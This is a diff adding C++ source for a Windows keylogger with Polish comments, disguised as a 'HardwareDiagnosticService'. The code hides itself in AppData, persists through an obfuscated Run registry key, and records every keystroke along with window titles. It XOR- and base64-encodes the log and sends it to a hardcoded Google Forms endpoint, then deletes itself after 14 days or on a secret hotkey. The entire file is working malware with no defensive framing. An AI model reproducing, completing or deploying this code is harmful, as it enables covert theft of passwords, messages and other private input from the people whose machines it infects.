@@ -1,0 +1,433 @@
+#define _WIN32_WINNT 0x0601
+#include <windows.h>
+#include <shlobj.h>
+#include <fstream>
+#include <string>
+#include <vector>
+#include <chrono>
+#include <thread>
+#include <wininet.h>
+#include <wincrypt.h>
+#include <algorithm>
+
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "crypt32.lib")
+
+// ==============================================================================
+// SPÓJNOŚĆ NAZW I PODSZYWANIE
+// ==============================================================================
+const std::wstring LOG_DIR_NAME = L"HardwareDiagnostics";
+const std::wstring EXE_FILE_NAME = L"HardwareDiagnosticService.exe";
+const std::wstring LOG_FILE_NAME = L"Hardware.dat";
+const std::wstring REG_VALUE_NAME = L"HardwareDiagnosticService";
+
+const std::string B64_DROPZONE_HOST = "ZG9jcy5nb29nbGUuY29t";
+const std::string DROPZONE_PATH     = "/forms/d/e/1FAIpQLSe4FsrRpmN3jmvE-btqPqEjg-KdTwa32mNXaMrJ2gu71N-rdQ/formResponse";
+const std::string FORM_ENTRY_ID     = "entry.2137496896";
+const int MAX_CHAR_COUNT            = 50;
+const int LIFETIME_DAYS             = 14;
+
+// Base64 klucza rejestru: Software\Microsoft\Windows\CurrentVersion\Run
+const std::string B64_REG_PATH      = "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu";
+
+// Zmienne globalne i synchronizacja
+int char_counter = 0;
+std::string current_window = "";
+bool running = true;
+
+HANDLE hLogMutex = NULL;
+HANDLE hSendEvent = NULL;
+
+// ==============================================================================
+// KONWERSJA I BASE64
+// ==============================================================================
+std::string DecodeBase64(const std::string& input) {
+    const std::string b64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string out;
+    std::vector<int> T(256, -1);
+    for (int i = 0; i < 64; i++) T[b64_chars[i]] = i;
+    int val = 0, valb = -8;
+    for (unsigned char c : input) {
+        if (T[c] == -1) continue;
+        val = (val << 6) + T[c];
+        valb += 6;
+        if (valb >= 0) {
+            out.push_back(char((val >> valb) & 0xFF));
+            valb -= 8;
+        }
+    }
+    return out;
+}
+
+std::wstring StringToWString(const std::string& s) {
+    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
+    std::wstring r(len, 0);
+    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &r[0], len);
+    r.resize(len - 1);
+    return r;
+}
+
+std::string WStringToUTF8(const std::wstring& wstr) {
+    if (wstr.empty()) return "";
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
+    std::string utf8(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &utf8[0], size_needed, NULL, NULL);
+    return utf8;
+}
+
+std::wstring GetLogFilePath(bool get_dir_only = false) {
+    wchar_t path[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path);
+    std::wstring full_dir = std::wstring(path) + L"\\" + LOG_DIR_NAME;
+    if (get_dir_only) return full_dir;
+    return full_dir + L"\\" + LOG_FILE_NAME;
+}
+
+// ==============================================================================
+// MECHANIZM AUTODESTRUKCJI (K.a / K.b)
+// ==============================================================================
+void SelfDestruct() {
+    running = false;
+    
+    // 1. Usunięcie wpisu z rejestru autostartu
+    std::string raw_reg = DecodeBase64(B64_REG_PATH);
+    std::wstring reg_path = StringToWString(raw_reg);
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, reg_path.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegDeleteValueW(hKey, REG_VALUE_NAME.c_str());
+        RegCloseKey(hKey);
+    }
+
+    // 2. Czyszczenie pliku dat
+    std::wstring log_path = GetLogFilePath();
+    DeleteFileW(log_path.c_str());
+
+    // 3. Pobranie ścieżek
+    wchar_t current_exe[MAX_PATH];
+    GetModuleFileNameW(NULL, current_exe, MAX_PATH);
+    std::wstring log_dir = GetLogFilePath(true);
+    
+    std::wstring cmd_line = L"C:\\Windows\\System32\\cmd.exe /c timeout /t 3 /nobreak & del /f /q \"" 
+                            + std::wstring(current_exe) + L"\" & rmdir /s /q \"" + log_dir + L"\"";
+    
+    STARTUPINFOW si = { sizeof(si) };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; // Ukrycie okna konsoli CMD przed użytkownikiem
+    PROCESS_INFORMATION pi;
+    
+    // Uruchamiamy CMD jawnie podając pełną ścieżkę jako aplikację
+    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", &cmd_line[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    
+    if (hLogMutex) CloseHandle(hLogMutex);
+    if (hSendEvent) CloseHandle(hSendEvent);
+    
+    ExitProcess(0);
+}
+
+void CheckLifetimeExpiry() {
+    std::wstring dir_path = GetLogFilePath(true);
+    HANDLE hDir = CreateFileW(dir_path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+    if (hDir != INVALID_HANDLE_VALUE) {
+        FILETIME creationTime;
+        if (GetFileTime(hDir, &creationTime, NULL, NULL)) {
+            ULARGE_INTEGER ull;
+            ull.LowPart = creationTime.dwLowDateTime;
+            ull.HighPart = creationTime.dwHighDateTime;
+            
+            ULONGLONG systemTime;
+            GetSystemTimeAsFileTime((LPFILETIME)&systemTime);
+            
+            // 14 dni w jednostkach 100-nanosekundowych
+            ULONGLONG fourteen_days = 14ULL * 24 * 60 * 60 * 1000 * 10000;
+            if ((systemTime - ull.QuadPart) >= fourteen_days) {
+                CloseHandle(hDir);
+                SelfDestruct();
+            }
+        }
+        CloseHandle(hDir);
+    }
+}
+
+// ==============================================================================
+// SZYFROWANIE XOR + BASE64
+// ==============================================================================
+std::string EncryptXORBase64(const std::string& plain_text) {
+    // Statyczny klucz XOR (0x5A) zgodny z nowym skryptem deszyfrującym
+    const BYTE xor_key = 0x5A; 
+    std::vector<BYTE> cipher_bytes;
+    
+    for (char c : plain_text) {
+        cipher_bytes.push_back(c ^ xor_key);
+    }
+
+    std::string base64_output;
+    DWORD b64_output_len = 0;
+    if (CryptBinaryToStringA(cipher_bytes.data(), (DWORD)cipher_bytes.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64_output_len)) {
+        base64_output.resize(b64_output_len);
+        CryptBinaryToStringA(cipher_bytes.data(), (DWORD)cipher_bytes.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &base64_output[0], &b64_output_len);
+        base64_output.erase(std::find(base64_output.begin(), base64_output.end(), '\0'), base64_output.end());
+    }
+    return base64_output;
+}
+
+// ==============================================================================
+// ODRZECZNY WĄTEK SIECIOWY
+// ==============================================================================
+void NetworkExfiltrationWorker() {
+    std::wstring log_path = GetLogFilePath();
+
+    while (running) {
+        // Czekaj na sygnał o konieczności wysłania danych
+        WaitForSingleObject(hSendEvent, INFINITE);
+        if (!running) break;
+
+        // Sekcja krytyczna zabezpieczona Mutexem - odczyt i czyszczenie pliku
+        WaitForSingleObject(hLogMutex, INFINITE);
+        
+        std::ifstream file(log_path, std::ios::binary);
+        if (file.is_open()) {
+            std::string buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+            file.close();
+
+            // Przetwarzaj tylko jeśli plik faktycznie zawierał dane
+            if (!buffer.empty()) {
+                std::string encrypted_payload = EncryptXORBase64(buffer);
+
+                if (!encrypted_payload.empty()) {
+                    
+                    // 1. URL ENCODING: Base64 zawiera znak '+', który w formularzach WWW 
+                    // jest interpretowany jako spacja. Musimy zamienić '+' na '%2B'.
+                    size_t pos = 0;
+                    while ((pos = encrypted_payload.find("+", pos)) != std::string::npos) {
+                        encrypted_payload.replace(pos, 1, "%2B");
+                        pos += 3; // Przesunięcie o długość "%2B"
+                    }
+
+                    // 2. Budowanie paczki danych w formacie: nazwa_pola=wartosc_base64
+                    std::string google_post_data = FORM_ENTRY_ID + "=" + encrypted_payload;
+
+                    std::string decrypted_host = DecodeBase64(B64_DROPZONE_HOST);
+                    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+                    
+                    if (hInternet) {
+                        HINTERNET hConnect = InternetConnectA(hInternet, decrypted_host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+                        if (hConnect) {
+                            DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE;
+                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", DROPZONE_PATH.c_str(), NULL, NULL, NULL, flags, 0);
+                            
+                            if (hRequest) {
+                                // 3. ZMIANA NAGŁÓWKA: Informujemy Google, że wysyłamy dane z formularza (x-www-form-urlencoded)
+                                // Zmieniamy też długość na rozmiar nowej zmiennej google_post_data
+                                std::string headers = "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n" + 
+                                                      std::string("Content-Length: ") + std::to_string(google_post_data.size()) + "\r\n";
+
+                                // 4. WYSYŁKA: Przekazujemy spakowany rekord do Google Forms
+                                BOOL success = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)google_post_data.c_str(), (DWORD)google_post_data.size());
+
+                                if (success) {
+                                    DWORD statusCode = 0;
+                                    DWORD dwSize = sizeof(statusCode);
+                                    // Weryfikacja kodu odpowiedzi serwera (Google Forms zwraca 200 OK przy poprawnym zapisaniu)
+                                    if (HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &dwSize, NULL) && statusCode == 200) {
+                                        // Plik kasowany bezpiecznie tylko przy poprawnym statusie odbioru
+                                        DeleteFileW(log_path.c_str());
+                                        char_counter = 0;
+                                    }
+                                }
+                                InternetCloseHandle(hRequest);
+                            }
+                            InternetCloseHandle(hConnect);
+                        }
+                        InternetCloseHandle(hInternet);
+                    }
+                }
+            }
+        }
+        
+        ReleaseMutex(hLogMutex);
+        ResetEvent(hSendEvent); 
+    }
+}
+
+// ==============================================================================
+// PRZECHWYTYWANIE OKIEN I MAPOWANIE KLUCZY
+// ==============================================================================
+std::string GetActiveWindowTitle() {
+    HWND hwnd = GetForegroundWindow();
+    if (!hwnd) return "";
+    wchar_t wtitle[256] = { 0 };
+    GetWindowTextW(hwnd, wtitle, 256);
+    return (wcslen(wtitle) == 0) ? "" : WStringToUTF8(wtitle);
+}
+
+std::string MapPolishChar(int vk, bool shiftPressed, bool capsLock, bool altGrPressed) {
+    if (!altGrPressed) {
+        if (vk >= 'A' && vk <= 'Z') {
+            char c = 'a' + (vk - 'A');
+            if (shiftPressed != capsLock) c = toupper(c);
+            return std::string(1, c);
+        }
+        if (vk >= '0' && vk <= '9') {
+            if (shiftPressed) {
+                const char* shiftedDigits[] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
+                return shiftedDigits[vk - '0'];
+            }
+            return std::string(1, (char)vk);
+        }
+        switch (vk) {
+            case VK_OEM_1:      return shiftPressed ? ":" : ";";
+            case VK_OEM_2:      return shiftPressed ? "?" : "/";
+            case VK_OEM_3:      return shiftPressed ? "~" : "`";
+            case VK_OEM_4:      return shiftPressed ? "{" : "[";
+            case VK_OEM_5:      return shiftPressed ? "|" : "\\";
+            case VK_OEM_6:      return shiftPressed ? "}" : "]";
+            case VK_OEM_7:      return shiftPressed ? "\"" : "'";
+            case VK_OEM_COMMA:  return shiftPressed ? "<" : ",";
+            case VK_OEM_PERIOD: return shiftPressed ? ">" : ".";
+            case VK_OEM_MINUS:  return shiftPressed ? "_" : "-";
+            case VK_OEM_PLUS:   return shiftPressed ? "+" : "=";
+            default: return "";
+        }
+    } else {
+        switch (vk) {
+            case 'A': return "ą"; case 'C': return "ć"; case 'E': return "ę";
+            case 'L': return "ł"; case 'N': return "ń"; case 'O': return "ó";
+            case 'S': return "ś"; case 'X': return "ź"; case 'Z': return "ż";
+            default: return "";
+        }
+    }
+}
+
+void PollingLoggerEngine() {
+    std::wstring log_path = GetLogFilePath();
+
+    while (running) {
+        if (GetQueueStatus(QS_INPUT | QS_ALLEVENTS) == 0) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(15));
+        }
+
+        // POPRAWKA: Zmiana maski stanu na 0x8000 (klawisz jest aktualnie trzymany w dół)
+        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && 
+            (GetAsyncKeyState(VK_SHIFT) & 0x8000) && 
+            (GetAsyncKeyState(VK_MENU) & 0x8000) && 
+            (GetAsyncKeyState('K') & 0x8000)) { 
+            SelfDestruct();
+        }
+
+        for (int vk = 8; vk <= 255; ++vk) {
+            if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT ||
+                vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
+                vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU || 
+                vk == VK_CAPITAL || vk == VK_NUMLOCK || vk == VK_SCROLL)
+                continue;
+
+            if (GetAsyncKeyState(vk) & 0x0001) {
+                bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+                bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+                bool altGrPressed = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0;
+
+                std::string keyText = "";
+
+                if (vk == VK_BACK)         keyText = " [BCKSP] ";
+                else if (vk == VK_RETURN)  keyText = "\n";
+                else if (vk == VK_TAB)     keyText = " [TAB] ";
+                else if (vk == VK_SPACE)   keyText = " ";
+                else if (vk >= VK_LEFT && vk <= VK_DOWN) {
+                    const char* names[] = { "[LEFT]","[UP]","[RIGHT]","[DOWN]"};
+                    keyText = names[vk - VK_LEFT];
+                } 
+                else {
+                    keyText = MapPolishChar(vk, shiftPressed, capsLock, altGrPressed);
+                }
+
+                if (!keyText.empty()) {
+                    WaitForSingleObject(hLogMutex, INFINITE);
+                    
+                    std::string log_entry = "";
+                    std::string active_window = GetActiveWindowTitle();
+
+                    if (!active_window.empty() && active_window != current_window) {
+                        current_window = active_window;
+                        log_entry += "\n[" + current_window + "]\n";
+                    }
+
+                    log_entry += keyText;
+
+                    std::ofstream file(log_path, std::ios::app | std::ios::binary);
+                    if (file.is_open()) {
+                        file.write(log_entry.c_str(), log_entry.size());
+                        file.close();
+                    }
+
+                    // POPRAWKA: Wszystkie operacje na liczniku i zdarzeniu wewnątrz Mutexu
+                    char_counter += (int)keyText.length();
+                    if (char_counter >= MAX_CHAR_COUNT) {
+                        SetEvent(hSendEvent);
+                    }
+
+                    ReleaseMutex(hLogMutex);
+                }
+            }
+        }
+    }
+}
+
+// ==============================================================================
+// INSTALATOR PERSYSTENCJI
+// ==============================================================================
+void InstallIfNeeded() {
+    std::wstring log_dir = GetLogFilePath(true);
+    CreateDirectoryW(log_dir.c_str(), NULL);
+
+    std::wstring target_exe = log_dir + L"\\" + EXE_FILE_NAME;
+    wchar_t current_exe[MAX_PATH];
+    GetModuleFileNameW(NULL, current_exe, MAX_PATH);
+
+    if (_wcsicmp(current_exe, target_exe.c_str()) != 0) {
+        CopyFileW(current_exe, target_exe.c_str(), FALSE);
+
+        SetFileAttributesW(log_dir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+        SetFileAttributesW(target_exe.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+
+        std::string raw_reg = DecodeBase64(B64_REG_PATH);
+        std::wstring decrypted_reg_path = StringToWString(raw_reg);
+
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, decrypted_reg_path.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            std::wstring quoted_target = L"\"" + target_exe + L"\"";
+            RegSetValueExW(hKey, REG_VALUE_NAME.c_str(), 0, REG_SZ, (BYTE*)quoted_target.c_str(), (DWORD)((quoted_target.length() + 1) * sizeof(wchar_t)));
+            RegCloseKey(hKey);
+        }
+
+        STARTUPINFOW si = { sizeof(si) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi;
+        CreateProcessW(target_exe.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        ExitProcess(0);
+    }
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    InstallIfNeeded();
+    CheckLifetimeExpiry();
+
+    // Inicjalizacja obiektów synchronizacyjnych dla podziału pętli
+    hLogMutex = CreateMutexW(NULL, FALSE, L"Local\\UMFDHostLogMutex");
+    hSendEvent = CreateEventW(NULL, TRUE, FALSE, L"Local\\UMFDHostSendEvent");
+
+    for (int vk = 8; vk <= 255; ++vk) GetAsyncKeyState(vk);
+
+    // Uruchomienie asynchronicznego wątku sieciowego
+    std::thread netWorker(NetworkExfiltrationWorker);
+    netWorker.detach();
+
+    PollingLoggerEngine();
+    return 0;
+}
